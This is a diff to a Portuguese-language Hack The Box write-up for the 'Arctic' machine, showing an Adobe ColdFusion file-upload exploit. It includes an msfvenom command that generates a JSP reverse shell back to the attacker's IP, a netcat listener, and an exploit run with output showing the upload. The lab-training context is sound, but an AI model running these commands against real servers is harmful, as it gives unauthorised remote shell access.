@@ -97,3 +97,35 @@ Tentei login com  a senha encontrada, mas sem sucesso
 
 Vamos tentar entao a segunda exploracao que encontramos **Adobe ColdFusion 2018 - Arbitrary File Upload**
 
+Depois de algumas pesquisas encontrei um exploit funcional https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload
+
+Entao, gerei meu payload em jsp com o seguinte comando abaixo https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/
+
+` msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.36 LPORT=53 -f raw > shell.jsp`
+
+Start seu ouvinte na porta escolhida usando o nc, neste caso eu usei a porta 53
+
+```
+root@kali:~/HTB-Windows/arctic# rlwrap nc -nlvp 53
+listening on [any] 53 ...
+```
+
+Execute o exploit
+
+```
+root@kali:~/HTB-Windows/arctic# python exploit.py 
+Usage: ./exploit.py <target ip/hostname> <target port> [/path/to/coldfusion] </path/to/payload.jsp>
+Example: ./exploit.py example.com 8500 /home/arrexel/shell.jsp
+root@kali:~/HTB-Windows/arctic# python exploit.py 10.10.10.11 8500 /root/HTB-Windows/arctic/shell.jsp 
+Sending payload...
+Successfully uploaded payload!
+Find it at http://10.10.10.11:8500/userfiles/file/exploit.jsp
+```
+
+E acesse via browser a URL http://10.10.10.11:8500/userfiles/file/exploit.jsp
+
+![7.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-arctic/7.jpg)
+
+
+
+
